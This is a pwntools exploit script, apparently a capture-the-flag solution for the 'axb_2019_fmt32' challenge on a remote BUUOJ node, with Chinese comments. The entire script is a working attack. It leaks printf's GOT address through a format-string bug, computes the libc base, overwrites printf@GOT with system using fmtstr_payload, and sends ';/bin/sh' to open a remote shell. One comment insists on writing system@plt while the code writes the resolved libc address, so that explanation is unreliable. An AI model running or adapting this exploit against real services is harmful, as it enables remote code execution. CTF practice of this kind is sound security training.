from pwn import *

# r = process(r'./axb_2019_fmt32')
r = remote('node5.buuoj.cn', 25427)
elf = ELF(r'./axb_2019_fmt32')
libc = ELF(r'../libc/libc-2.23_32.so')
context.log_level = 'debug'

# Please tell me:baaaa.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
# Repeater:baaaa.0x804888d.0xff88dfaf.0x340.0x340.0x340.0x2e.0x62000340.0x61616161.0x2e70252e.0x252e7025
# 补了一个字母b之后偏移为8

# gdb.attach(r)
printf_got = elf.got['printf']
# B用来补全8位来完整偏移8的输出，A用来作为标志接收泄露的printf地址,
# 利用格式化字符串漏洞的%8$s去泄露出栈上相对距离为8的地址上的值
payload = b'B' + p32(printf_got) + b'A' + b'%8$s'
r.sendlineafter(b'me:', payload)
r.recvuntil(b'A')
printf_addr = u32(r.recv(4))
print(hex(printf_addr))

base_addr = printf_addr - libc.sym['printf']
system_addr = base_addr + libc.sym['system']

# 将printf@got修改为system@plt的地址，而非system的实际地址（如system@got中解析后的地址）
# 因为当程序首次调用system时，system@plt会触发动态链接器解析system的真实地址，并写入system@got，后续调用system时，system@plt会直接跳转到system@got中存储的真实地址
# 如果直接将printf@got修改为system的真实地址（从system@got中获取）会导致：
# 1、若程序从未调用过system，system@got中存储的不是真实地址
# 2、若开启ASLR，system的真实地址每次运行都会变化，而plt表的地址是固定的。使用system@plt可避免受地址随机化的影响
'''
fmtstr_payload(offset, writes, numbwritten=0, write_size='byte')
第一个参数表示格式化字符串的偏移；
第二个参数表示需要利用%n写入的数据，采用字典形式，我们要将printf的GOT数据改为system函数地址，就写成{printfGOT:systemAddress}
第三个参数表示已经输出的字符个数，这里0xa=1（payload前面的a）+9（repeater：的长度）
第四个参数表示写入方式，是按字节（byte）、按双字节（short）还是按四字节（int），对应着hhn、hn和n，默认值是byte，即按hhn写。
'''
payload2 = b'A' + fmtstr_payload(8, {printf_got: system_addr}, write_size="byte", numbwritten=0xa)
r.sendline(payload2)
r.send(b';/bin/sh\x00')
r.interactive()
